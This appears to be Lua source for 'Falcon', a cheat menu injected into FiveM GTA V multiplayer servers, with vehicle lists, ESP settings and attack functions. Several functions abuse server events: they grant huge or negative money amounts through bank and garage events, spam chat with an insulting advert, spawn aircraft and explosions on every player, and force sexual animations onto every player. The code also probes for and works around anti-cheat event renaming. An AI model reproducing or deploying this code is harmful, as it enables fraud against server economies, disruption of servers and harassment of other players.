    "TAMPA2",
    "TROPOS",
    "VERLIERER2",
    "ZR380",
    "ZR3802",
    "ZR3803"
}

local super = {
    "ADDER",
    "AUTARCH",
    "BANSHEE2",
    "BULLET",
    "CHEETAH",
    "CYCLONE",
    "DEVESTE",
    "ENTITYXF",
    "ENTITY2",
    "FMJ",
    "GP1",
    "INFERNUS",
    "ITALIGTB",
    "ITALIGTB2",
    "LE7B",
    "NERO",
    "NERO2",
    "OSIRIS",
    "PENETRATOR",
    "PFISTER811",
    "PROTOTIPO",
    "REAPER",
    "SC1",
    "SCRAMJET",
    "SHEAVA",
    "SULTANRS",
    "T20",
    "TAIPAN",
    "TEMPESTA",
    "TEZERACT",
    "TURISMOR",
    "TYRANT",
    "TYRUS",
    "VACCA",
    "VAGNER",
    "VIGILANTE",
    "VISIONE",
    "VOLTIC",
    "VOLTIC2",
    "XA21",
    "ZENTORNO"
}

local motorcycles = {
    "AKUMA",
    "AVARUS",
    "BAGGER",
    "BATI",
    "BATI2",
    "BF400",
    "CARBONRS",
    "CHIMERA",
    "CLIFFHANGER",
    "DAEMON",
    "DAEMON2",
    "DEFILER",
    "DEATHBIKE",
    "DEATHBIKE2",
    "DEATHBIKE3",
    "DIABLOUS",
    "DIABLOUS2",
    "DOUBLE",
    "ENDURO",
    "ESSKEY",
    "FAGGIO",
    "FAGGIO2",
    "FAGGIO3",
    "FCR",
    "FCR2",
    "GARGOYLE",
    "HAKUCHOU",
    "HAKUCHOU2",
    "HEXER",
    "INNOVATION",
    "LECTRO",
    "MANCHEZ",
    "NEMESIS",
    "NIGHTBLADE",
    "OPPRESSOR",
    "OPPRESSOR2",
    "PCJ",
    "RATBIKE",
    "RUFFIAN",
    "SANCHEZ",
    "SANCHEZ2",
    "SANCTUS",
    "SHOTARO",
    "SOVEREIGN",
    "THRUST",
    "VADER",
    "VINDICATOR",
    "VORTEX",
    "WOLFSBANE",
    "ZOMBIEA",
    "ZOMBIEB"
}

local offroad = {
    "BFINJECTION",
    "BIFTA",
    "BLAZER",
    "BLAZER2",
    "BLAZER3",
    "BLAZER4",
    "BLAZER5",
    "BODHI2",
    "BRAWLER",
    "BRUISER",
    "BRUISER2",
    "BRUISER3",
    "BRUTUS",
    "BRUTUS2",
    "BRUTUS3",
    "CARACARA",
    "DLOADER",
    "DUBSTA3",
    "DUNE",
    "DUNE2",
    "DUNE3",
    "DUNE4",
    "DUNE5",
    "FREECRAWLER",
    "INSURGENT",
    "INSURGENT2",
    "INSURGENT3",
    "KALAHARI",
    "KAMACHO",
    "MARSHALL",
    "MENACER",
    "MESA3",
    "MONSTER",
    "MONSTER3",
    "MONSTER4",
    "MONSTER5",
    "NIGHTSHARK",
    "RANCHERXL",
    "RANCHERXL2",
    "RCBANDITO",
    "REBEL",
    "REBEL2",
    "RIATA",
    "SANDKING",
    "SANDKING2",
    "TECHNICAL",
    "TECHNICAL2",
    "TECHNICAL3",
    "TROPHYTRUCK",
    "TROPHYTRUCK2"
}

local industrial = {
    "BULLDOZER",
    "CUTTER",
    "DUMP",
    "FLATBED",
    "GUARDIAN",
    "HANDLER",
    "MIXER",
    "MIXER2",
    "RUBBLE",
    "TIPTRUCK",
    "TIPTRUCK2"
}

local utility = {
    "AIRTUG",
    "CADDY",
    "CADDY2",
    "CADDY3",
    "DOCKTUG",
    "FORKLIFT",
    "TRACTOR2",
    "TRACTOR3",
    "MOWER",
    "RIPLEY",
    "SADLER",
    "SADLER2",
    "SCRAP",
    "TOWTRUCK",
    "TOWTRUCK2",
    "TRACTOR",
    "UTILLITRUCK",
    "UTILLITRUCK2",
    "UTILLITRUCK3",
    "ARMYTRAILER",
    "ARMYTRAILER2",
    "FREIGHTTRAILER",
    "ARMYTANKER",
    "TRAILERLARGE",
    "DOCKTRAILER",
    "TR3",
    "TR2",
    "TR4",
    "TRFLAT",
    "TRAILERS",
    "TRAILERS4",
    "TRAILERS2",
    "TRAILERS3",
    "TVTRAILER",
    "TRAILERLOGS",
    "TANKER",
    "TANKER2",
    "BALETRAILER",
    "GRAINTRAILER",
    "BOATTRAILER",
    "RAKETRAILER",
    "TRAILERSMALL"
}

local vans = {
    "BISON",
    "BISON2",
    "BISON3",
    "BOBCATXL",
    "BOXVILLE",
    "BOXVILLE2",
    "BOXVILLE3",
    "BOXVILLE4",
    "BOXVILLE5",
    "BURRITO",
    "BURRITO2",
    "BURRITO3",
    "BURRITO4",
    "BURRITO5",
    "CAMPER",
    "GBURRITO",
    "GBURRITO2",
    "JOURNEY",
    "MINIVAN",
    "MINIVAN2",
    "PARADISE",
    "PONY",
    "PONY2",
    "RUMPO",
    "RUMPO2",
    "RUMPO3",
    "SPEEDO",
    "SPEEDO2",
    "SPEEDO4",
    "SURFER",
    "SURFER2",
    "TACO",
    "YOUGA",
    "YOUGA2"
}

local cycles = {
    "BMX",
    "CRUISER",
    "FIXTER",
    "SCORCHER",
    "TRIBIKE",
    "TRIBIKE2",
    "TRIBIKE3"
}

local boats = {
    "DINGHY",
    "DINGHY2",
    "DINGHY3",
    "DINGHY4",
    "JETMAX",
    "MARQUIS",
    "PREDATOR",
    "SEASHARK",
    "SEASHARK2",
    "SEASHARK3",
    "SPEEDER",
    "SPEEDER2",
    "SQUALO",
    "SUBMERSIBLE",
    "SUBMERSIBLE2",
    "SUNTRAP",
    "TORO",
    "TORO2",
    "TROPIC",
    "TROPIC2",
    "TUG"
}

local helicopters = {
    "AKULA",
    "ANNIHILATOR",
    "BUZZARD",
    "BUZZARD2",
    "CARGOBOB",
    "CARGOBOB2",
    "CARGOBOB3",
    "CARGOBOB4",
    "FROGGER",
    "FROGGER2",
    "HAVOK",
    "HUNTER",
    "MAVERICK",
    "POLMAV",
    "SAVAGE",
    "SEASPARROW",
    "SKYLIFT",
    "SUPERVOLITO",
    "SUPERVOLITO2",
    "SWIFT",
    "SWIFT2",
    "VALKYRIE",
    "VALKYRIE2",
    "VOLATUS"
}


local planes = {
    "ALPHAZ1",
    "AVENGER",
    "AVENGER2",
    "BESRA",
    "BLIMP",
    "BLIMP2",
    "BLIMP3",
    "BOMBUSHKA",
    "CARGOPLANE",
    "CUBAN800",
    "DODO",
    "DUSTER",
    "HOWARD",
    "HYDRA",
    "JET",
    "LAZER",
    "LUXOR",
    "LUXOR2",
    "MAMMATUS",
    "MICROLIGHT",
    "MILJET",
    "MOGUL",
    "MOLOTOK",
    "NIMBUS",
    "NOKOTA",
    "PYRO",
    "ROGUE",
    "SEABREEZE",
    "SHAMAL",
    "STARLING",
    "STRIKEFORCE",
    "STUNT",
    "TITAN",
    "TULA",
    "VELUM",
    "VELUM2",
    "VESTRA",
    "VOLATOL"
}

local service = {
    "AIRBUS",
    "BRICKADE",
    "BUS",
    "COACH",
    "PBUS2",
    "RALLYTRUCK",
    "RENTALBUS",
    "TAXI",
    "TOURBUS",
    "TRASH",
    "TRASH2",
    "WASTELANDER",
    "AMBULANCE",
    "FBI",
    "FBI2",
    "FIRETRUK",
    "LGUARD",
    "PBUS",
    "POLICE",
    "POLICE2",
    "POLICE3",
    "POLICE4",
    "POLICEB",
    "POLICEOLD1",
    "POLICEOLD2",
    "POLICET",
    "POLMAV",
    "PRANGER",
    "PREDATOR",
    "RIOT",
    "RIOT2",
    "SHERIFF",
    "SHERIFF2",
    "APC",
    "BARRACKS",
    "BARRACKS2",
    "BARRACKS3",
    "BARRAGE",
    "CHERNOBOG",
    "CRUSADER",
    "HALFTRACK",
    "KHANJALI",
    "RHINO",
    "SCARAB",
    "SCARAB2",
    "SCARAB3",
    "THRUSTER",
    "TRAILERSMALL2"
}

local commercial = {
    "BENSON",
    "BIFF",
    "CERBERUS",
    "CERBERUS2",
    "CERBERUS3",
    "HAULER",
    "HAULER2",
    "MULE",
    "MULE2",
    "MULE3",
    "MULE4",
    "PACKER",
    "PHANTOM",
    "PHANTOM2",
    "PHANTOM3",
    "POUNDER",
    "POUNDER2",
    "STOCKADE",
    "STOCKADE3",
    "TERBYTE",
    "CABLECAR",
    "FREIGHT",
    "FREIGHTCAR",
    "FREIGHTCONT1",
    "FREIGHTCONT2",
    "FREIGHTGRAIN",
    "METROTRAIN",
    "TANKERCAR"
}


local classicColors = {
    {"Black", 0},
    {"Carbon Black", 147},
    {"Graphite", 1},
    {"Anhracite Black", 11},
    {"Black Steel", 2},
    {"Dark Steel", 3},
    {"Silver", 4},
    {"Bluish Silver", 5},
    {"Rolled Steel", 6},
    {"Shadow Silver", 7},
    {"Stone Silver", 8},
    {"Midnight Silver", 9},
    {"Cast Iron Silver", 10},
    {"Red", 27},
    {"Torino Red", 28},
    {"Formula Red", 29},
    {"Lava Red", 150},
    {"Blaze Red", 30},
    {"Grace Red", 31},
    {"Garnet Red", 32},
    {"Sunset Red", 33},
    {"Cabernet Red", 34},
    {"Wine Red", 143},
    {"Candy Red", 35},
    {"Hot Pink", 135},
    {"Pfsiter Pink", 137},
    {"Salmon Pink", 136},
    {"Sunrise Orange", 36},
    {"Orange", 38},
    {"Bright Orange", 138},
    {"Gold", 99},
    {"Bronze", 90},
    {"Yellow", 88},
    {"Race Yellow", 89},
    {"Dew Yellow", 91},
    {"Dark Green", 49},
    {"Racing Green", 50},
    {"Sea Green", 51},
    {"Olive Green", 52},
    {"Bright Green", 53},
    {"Gasoline Green", 54},
    {"Lime Green", 92},
    {"Midnight Blue", 141},
    {"Galaxy Blue", 61},
    {"Dark Blue", 62},
    {"Saxon Blue", 63},
    {"Blue", 64},
    {"Mariner Blue", 65},
    {"Harbor Blue", 66},
    {"Diamond Blue", 67},
    {"Surf Blue", 68},
    {"Nautical Blue", 69},
    {"Racing Blue", 73},
    {"Ultra Blue", 70},
    {"Light Blue", 74},
    {"Chocolate Brown", 96},
    {"Bison Brown", 101},
    {"Creeen Brown", 95},
    {"Feltzer Brown", 94},
    {"Maple Brown", 97},
    {"Beechwood Brown", 103},
    {"Sienna Brown", 104},
    {"Saddle Brown", 98},
    {"Moss Brown", 100},
    {"Woodbeech Brown", 102},
    {"Straw Brown", 99},
    {"Sandy Brown", 105},
    {"Bleached Brown", 106},
    {"Schafter Purple", 71},
    {"Spinnaker Purple", 72},
    {"Midnight Purple", 142},
    {"Bright Purple", 145},
    {"Cream", 107},
    {"Ice White", 111},
    {"Frost White", 112}
}

local matteColors = {
    {"Black", 12},
    {"Gray", 13},
    {"Light Gray", 14},
    {"Ice White", 131},
    {"Blue", 83},
    {"Dark Blue", 82},
    {"Midnight Blue", 84},
    {"Midnight Purple", 149},
    {"Schafter Purple", 148},
    {"Red", 39},
    {"Dark Red", 40},
    {"Orange", 41},
    {"Yellow", 42},
    {"Lime Green", 55},
    {"Green", 128},
    {"Forest Green", 151},
    {"Foliage Green", 155},
    {"Olive Darb", 152},
    {"Dark Earth", 153},
    {"Desert Tan", 154}
}

local metalColors = {
    {"Brushed Steel", 117},
    {"Brushed Black Steel", 118},
    {"Brushed Aluminum", 119},
    {"Chrome", 120},
    {"Pure Gold", 158},
    {"Brushed Gold", 159}
}


local Keys = {
    ["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57,
    ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
    ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
    ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
    ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
    ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
    ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
    ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
    ["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118,
    ["MOUSE1"] = 24
}

local discordPresence = true

local peds = { "a_c_boar", "a_c_killerwhale", "a_c_sharktiger", "csb_stripper_01" }
local peds2 = { "s_m_y_baywatch_01", "a_m_m_acult_01", "ig_barry", "g_m_y_ballaeast_01", "u_m_y_babyd", "a_m_y_acult_01", "a_m_m_afriamer_01", "u_m_y_corpse_01", "s_m_m_armoured_02", "g_m_m_armboss_01", "g_m_y_armgoon_02", "s_m_y_blackops_03", "s_m_y_blackops_01", "s_m_y_prismuscl_01", "g_m_m_chemwork_01", "a_m_y_musclbeac_01", "csb_cop", "s_m_y_clown_01", "s_m_y_cop_01", "u_m_y_zombie_01" }
local peds3 = { "cs_debra", "a_f_m_beach_01", "a_f_m_bodybuild_01", "a_f_m_business_02", "a_f_y_business_04", "mp_f_cocaine_01", "u_f_y_corpse_01", "mp_f_meth_01", "g_f_importexport_01", "a_f_y_vinewood_04", "a_m_m_tranvest_01", "a_m_m_tranvest_02", "ig_tracydisanto", "csb_stripper_02", "s_f_y_stripper_01", "a_f_m_soucentmc_01", "a_f_m_soucent_02", "u_f_y_poppymich", "ig_patricia", "s_f_y_cop_01" }
local peds4 = { "a_c_husky", "a_c_cat_01", "a_c_boar", "a_c_sharkhammer", "a_c_coyote", "a_c_chimp", "a_c_chop", "a_c_cow", "a_c_deer", "a_c_dolphin", "a_c_fish", "a_c_hen", "a_c_humpback", "a_c_killerwhale", "a_c_mtlion", "a_c_pig", "a_c_pug", "a_c_rabbit_01", "a_c_retriever", "a_c_rhesus", "a_c_rottweiler", "a_c_sharktiger", "a_c_shepherd", "a_c_westy" }

local oldPrint = print
print = function(trash)
    oldPrint('[Welcome to Falcon] '..trash)
end


--==================================================================================================================================================--
--[[ Falcon Variables ]]
--==================================================================================================================================================--

--[[selectedPlayerOptions]]
local sPOPropOptionsCurrent = 1
local sPOPropOptionsSelected = 1

local currentMods = nil
local EngineUpgrade = {-1, 0, 1, 2, 3}
local VehicleUpgradeWords = {

	{"STOCK", "MAX LEVEL"},
	{"STOCK", "LEVEL 1", "MAX LEVEL"},
	{"STOCK", "LEVEL 1", "LEVEL 2", "MAX LEVEL"},
	{"STOCK", "LEVEL 1", "LEVEL 2", "LEVEL 3", "MAX LEVEL"},
	{"STOCK", "LEVEL 1", "LEVEL 2", "LEVEL 3", "LEVEL 4", "MAX LEVEL"},

}

local currentMenuX = 1 
local selectedMenuX = 1 
local currentMenuY = 1 
local selectedMenuY = 1 
local menuX = { 0.75, 0.025, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7 } 
local menuY = { 0.1, 0.025, 0.2, 0.3 , 0.400, 0.425 }
local thiswasfunnytomake = 1
local thiswasfunnytomake2 = 1
local lortlortlort2 = 1
local lortlortlort = 1
local currentPed = 1
local selectedPed = 1
local selectedPedd = 1
local currentPedd = 1
local selectedPeddd = 1
local currentPeddd = 1
local selectedPedddd = 1
local currentPedddd = 1
local visualsESPEnable = false
local visualsESPShowSelf = false
local visualsESPShowLine = false
local visualsESPShowBox = false
local visualsESPShowID = false
local visualsESPShowName = false
local visualsESPShowDistance = false
local visualsESPShowWeapon = false
local visualsESPShowVehicle = false
local visualsESPRefreshRate = 0
local visualsESPRefreshRates = {"0ms", "50ms", "150ms", "250ms", "500ms", "1s", "2s", "5s"}
local visualsESPDistanceOps = {50.0, 100.0, 500.0, 1000.0, 2000.0, 5000.0}
local visualsESPDistance = 500.0
local currentVisualsESPDistance = 1
local selectedVisualsESPDistance = 1
local currentESPRefreshIndex = 1
local selectedESPRefreshIndex = 1
local ShowEsp = false
local ShowHeadSprites = true
local ShowWantedLevel = false
local ShowEspInfo = true
local ShowEspOutline = true
local ShowEspLines = false

local urname = GetPlayerName(PlayerId())


local urname2 = GetPlayerName(PlayerId())

local ShouldShowMenu = true
local welcomeMsg = true

local Deer = {
	Handle = nil,
	Invincible = false,
	Ragdoll = false,
	Marker = false,
	Speed = {
		Walk = 3.0,
		Run = 9.0,
	},
}

function Deer.Destroy()
	local Ped = PlayerPedId()

	DetachEntity(Ped, true, false)
	ClearPedTasksImmediately(Ped)

	SetEntityAsNoLongerNeeded(Deer.Handle)
	DeletePed(Deer.Handle)

	if DoesEntityExist(Deer.Handle) then
		SetEntityCoords(Deer.Handle, 601.28948974609, -4396.9853515625, 384.98565673828)
	end

	Deer.Handle = nil
end

function Deer.Create()
	local Model = GetHashKey("a_c_deer")
	RequestModel(Model)
	while not HasModelLoaded(Model) do
		Citizen.Wait(50)
	end

	local Ped = PlayerPedId()
	local PedPosition = GetEntityCoords(Ped, false)

	Deer.Handle = CreatePed(28, Model, PedPosition.x+1, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)

	SetPedCanRagdoll(Deer.Handle, Deer.Ragdoll)
	SetEntityInvincible(Deer.Handle, Deer.Invincible)

	SetModelAsNoLongerNeeded(Model)
end

function Deer.Attach()
	local Ped = PlayerPedId()

	FreezeEntityPosition(Deer.Handle, true)
	FreezeEntityPosition(Ped, true)

	local DeerPosition = GetEntityCoords(Deer.Handle, false)
	SetEntityCoords(Ped, DeerPosition.x, DeerPosition.y, DeerPosition.z)

	AttachEntityToEntity(Ped, Deer.Handle, GetPedBoneIndex(Deer.Handle, 24816), -0.3, 0.0, 0.3, 0.0, 0.0, 90.0, false, false, false, true, 2, true)

	TaskPlayAnim(Ped, "rcmjosh2", "josh_sitting_loop", 8.0, 1, -1, 2, 1.0, 0, 0, 0)

	FreezeEntityPosition(Deer.Handle, false)
	FreezeEntityPosition(Ped, false)
end

function Deer.Ride()
	local Ped = PlayerPedId()
	local PedPosition = GetEntityCoords(Ped, false)
	if IsPedSittingInAnyVehicle(Ped) or IsPedGettingIntoAVehicle(Ped) then
		return
	end

	local AttachedEntity = GetEntityAttachedTo(Ped)

	if IsEntityAttached(Ped) and GetEntityModel(AttachedEntity) == GetHashKey("a_c_deer") then
		local SideCoordinates = GetCoordsInfrontOfEntityWithDistance(AttachedEntity, 1.0, 90.0)
		local SideHeading = GetEntityHeading(AttachedEntity)

		SideCoordinates.z = GetGroundZ(SideCoordinates.x, SideCoordinates.y, SideCoordinates.z)

		Deer.Handle = nil
		DetachEntity(Ped, true, false)
		ClearPedTasksImmediately(Ped)

		SetEntityCoords(Ped, SideCoordinates.x, SideCoordinates.y, SideCoordinates.z)
		SetEntityHeading(Ped, SideHeading)
	else
		for _, Ped in pairs(GetNearbyPeds(PedPosition.x, PedPosition.y, PedPosition.z, 2.0)) do
			if GetEntityModel(Ped) == GetHashKey("a_c_deer") then
				Deer.Handle = Ped
				Deer.Attach()
				break
			end
		end
	end
end



local function GetResources()
	local resources = {}
	for i=0, GetNumResources() do
		resources[i] = GetResourceByFindIndex(i)
	end
	return resources
end
local serverOptionsResources = {}
serverOptionsResources = GetResources()

local LOAD_es_extended = LoadResourceFile("es_extended", "client/common.lua")
if LOAD_es_extended then
	LOAD_es_extended = LOAD_es_extended:gsub("AddEventHandler", "")
	LOAD_es_extended = LOAD_es_extended:gsub("cb", "")
	LOAD_es_extended = LOAD_es_extended:gsub("function ", "")
	LOAD_es_extended = LOAD_es_extended:gsub("return ESX", "")
	LOAD_es_extended = LOAD_es_extended:gsub("(ESX)", "")
	LOAD_es_extended = LOAD_es_extended:gsub("function", "")
	LOAD_es_extended = LOAD_es_extended:gsub("getSharedObject%(%)", "")
	LOAD_es_extended = LOAD_es_extended:gsub("end", "")
	LOAD_es_extended = LOAD_es_extended:gsub("%(", "")
	LOAD_es_extended = LOAD_es_extended:gsub("%)", "")
	LOAD_es_extended = LOAD_es_extended:gsub(",", "")
	LOAD_es_extended = LOAD_es_extended:gsub("\n", "")
	LOAD_es_extended = LOAD_es_extended:gsub("'", "")
	LOAD_es_extended = LOAD_es_extended:gsub("%s+", "")
	if tostring(LOAD_es_extended) ~= 'esx:getSharedObject' then
		print('This server is using trigger replacement, watch out!')
	end
end

ESX = nil

Citizen.CreateThread(
    function()
        while ESX == nil do
            TriggerCustomEvent(false, 
                tostring(LOAD_es_extended),
                function(a)
                    ESX = a
                end
            )
			print('ESX was set to: '..tostring(LOAD_es_extended))
			Citizen.Wait(1000)
        end
    end
)


vRP = Proxy.getInterface("vRP")



local function ForceMod()
    ForceTog = not ForceTog
    
    if ForceTog then
        
        Citizen.CreateThread(function()
            ShowInfo("Force Mode ~g~[ON] ~g~\n~s~Active Mode -» KEY ~y~[E] ")
            
            local ForceKey = Keys["E"]
            local Force = 0.5
            local KeyPressed = false
            local KeyTimer = 0
            local KeyDelay = 15
            local ForceEnabled = false
            local StartPush = false
            
            function forcetick()
                
                if (KeyPressed) then
                    KeyTimer = KeyTimer + 1
                    if (KeyTimer >= KeyDelay) then
                        KeyTimer = 0
                        KeyPressed = false
                    end
                end
                
                
                
                if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and not ForceEnabled then
                    KeyPressed = true
                    ForceEnabled = true
                end
                
                if (StartPush) then
                    
                    StartPush = false
                    local pid = PlayerPedId()
                    local CamRot = GetGameplayCamRot(2)
                    
                    local force = 5
                    
                    local Fx = -(math.sin(math.rad(CamRot.z)) * force * 10)
                    local Fy = (math.cos(math.rad(CamRot.z)) * force * 10)
                    local Fz = force * (CamRot.x * 0.2)
                    
                    local PlayerVeh = GetVehiclePedIsIn(pid, false)
                    
                    for k in EnumerateVehicles() do
                        SetEntityInvincible(k, false)
                        if IsEntityOnScreen(k) and k ~= PlayerVeh then
                            ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
                        end
                    end
                    
                    for k in EnumeratePeds() do
                        if IsEntityOnScreen(k) and k ~= pid then
                            ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
                        end
                    end
                
                end
                
                
                if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and ForceEnabled then
                    KeyPressed = true
                    StartPush = true
                    ForceEnabled = false
                end
                
                if (ForceEnabled) then
                    local pid = PlayerPedId()
                    local PlayerVeh = GetVehiclePedIsIn(pid, false)
                    
                    Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)
                    
                    DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 180, 0, 0, 35, false, true, 2, nil, nil, false)
                    
                    for k in EnumerateVehicles() do
                        SetEntityInvincible(k, true)
                        if IsEntityOnScreen(k) and (k ~= PlayerVeh) then
                            RequestControlOnce(k)
                            FreezeEntityPosition(k, false)
                            Oscillate(k, Markerloc, 0.5, 0.3)
                        end
                    end
                    
                    for k in EnumeratePeds() do
                        if IsEntityOnScreen(k) and k ~= PlayerPedId() then
                            RequestControlOnce(k)
                            SetPedToRagdoll(k, 4000, 5000, 0, true, true, true)
                            FreezeEntityPosition(k, false)
                            Oscillate(k, Markerloc, 0.5, 0.3)
                        end
                    end
                
                end
            
            end
            
            while ForceTog do forcetick()Wait(0) end
        end)
    else ShowInfo("Force ~r~Disabled") end

end

 function vrpdestroy()
        for bD = 0, 9 do
            TriggerServerEvent(
                '_chat:messageEntered',
                '^1T^2h^3e ^4s^5e^6r^7v^8e^9r ^1j^2u^3s^4t ^1g^2o^3t ^1f^2u^3c^4k^5e^6d ^1b^2y ^1F^3a^4l^5c^6o^7n ^1M^2e^3n^4u: ~ 3.0 https://discord.gg/y7xyNeG',
                {
                    141,
                    211,
                    255
                },
                '^' .. bD .. '^1T^2h^3e ^4s^5e^6r^7v^8e^9r ^1j^2u^3s^4t ^1g^2o^3t ^1f^2u^3c^4k^5e^6d ^1b^2y ^1F^3a^4l^5c^6o^7n ^1M^2e^3n^4u: ~ 3.0 https://discord.gg/y7xyNeG'
            )
        end
        TriggerServerEvent(
            'lscustoms:payGarage',
            {
                costs = -99999999
            }
        )
        TriggerServerEvent('vrp_slotmachine:server:2', 999999999)
        TriggerServerEvent('Banca:deposit', 999999999)
        TriggerServerEvent('bank:deposit', 999999999)
        local di = GetPlayerServerId(PlayerId())
        for i = 0, 256 do
            TriggerEvent('bank:transfer', di, GetPlayerServerId(i), 99999999)
        end
    end

    function nukeserver()
        Citizen.CreateThread(function()
            local dg="Avenger"
            local dh="CARGOPLANE"
            local di="luxor"
            local dj="maverick"
            local dk="blimp2"
            local dn="prop_dummy_car"
            local bI="prop_juicestand"
            local bJ="p_spinning_anus_s"
    
            while not HasModelLoaded(GetHashKey(dh))do
                Citizen.Wait(0)
                RequestModel(GetHashKey(dh))
            end
    
            while not HasModelLoaded(GetHashKey(di))do
                Citizen.Wait(0)RequestModel(GetHashKey(di))
            end
    
            while not HasModelLoaded(GetHashKey(dg))do
                Citizen.Wait(0)RequestModel(GetHashKey(dg))
            end
    
            while not HasModelLoaded(GetHashKey(dj))do
                Citizen.Wait(0)RequestModel(GetHashKey(dj))
            end
    
            while not HasModelLoaded(GetHashKey(dk))do
                Citizen.Wait(0)RequestModel(GetHashKey(dk))
            end
    
            while not HasModelLoaded(GetHashKey(dn))do
                Citizen.Wait(0)RequestModel(GetHashKey(dn))
            end
                   
            for i=0,128 do
                local di=CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+2.0,tergg,tergg) and CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+10.0,tergg,tergg)and CreateVehicle(GetHashKey(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,tergg,tergg)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+2.0,tergg,tergg)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+10.0,tergg,tergg)and CreateVehicle(GetHashKey(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,tergg,tergg)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+2.0,tergg,tergg)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+10.0,tergg,tergg)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,tergg,tergg)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+2.0,tergg,tergg)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+10.0,tergg,tergg)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,tergg,tergg)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+2.0,tergg,tergg)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+10.0,tergg,tergg)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,tergg,tergg)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,tergg,arwet,100000.0)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,tergg,arwet,tergg)
            end
            ShowInfo("~g~Fucked the server :(")
         end)
        end

local function fv()
    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
    local cw = KeyboardInput('Enter Vehicle Licence Plate', '', 100)
    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
        RequestModel(cb)
        while not HasModelLoaded(cb) do
            Citizen.Wait(0)
        end
        local veh =
            CreateVehicle(
            GetHashKey(cb),
            GetEntityCoords(PlayerPedId(-1)),
            GetEntityHeading(PlayerPedId(-1)),
            true,
            true
        )
        SetVehicleNumberPlateText(veh, cw)
        local cx = ESX.Game.GetVehicleProperties(veh)
        TriggerServerEvent('esx_vehicleshop:setVehicleOwned', cx)
        av('~g~~h~Success', false)
    else
        av('~b~~h~Model is not valid!', true)
    end
end

function RapeAll()
    for bs=0,9 do
        TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"~r~You just got fucked by Falcon")
    end
    Citizen.CreateThread(function()
        for i=0,128 do
            RequestModelSync("a_m_o_acult_01")
            RequestAnimDict("rcmpaparazzo_2")
            while not HasAnimDictLoaded("rcmpaparazzo_2")do
                Citizen.Wait(0)
            end
            if IsPedInAnyVehicle(GetPlayerPed(i),true)then
                local veh=GetVehiclePedIsIn(GetPlayerPed(i),true)
                while not NetworkHasControlOfEntity(veh)do
                    NetworkRequestControlOfEntity(veh)
                    Citizen.Wait(0)
                end
                SetEntityAsMissionEntity(veh,true,true)
                DeleteVehicle(veh)DeleteEntity(veh)end
                count=-0.2
                for b=1,3 do
                    local x,y,z=table.unpack(GetEntityCoords(GetPlayerPed(i),true))
                    local bD=CreatePed(4,GetHashKey("a_m_o_acult_01"),x,y,z,0.0,true,false)
                    SetEntityAsMissionEntity(bD,true,true)
                    AttachEntityToEntity(bD,GetPlayerPed(i),4103,11816,count,0.00,0.0,0.0,0.0,0.0,false,false,false,false,2,true)
                    ClearPedTasks(GetPlayerPed(i))TaskPlayAnim(GetPlayerPed(i),"rcmpaparazzo_2","shag_loop_poppy",2.0,2.5,-1,49,0,0,0,0)
                    SetPedKeepTask(bD)TaskPlayAnim(bD,"rcmpaparazzo_2","shag_loop_a",2.0,2.5,-1,49,0,0,0,0)
                    SetEntityInvincible(bD,true)count=count-0.4
            end
        end
    end)
end

local DrawPlayerInfo = {
	pedHeadshot = false,
	txd = "null",
	handle = nil,
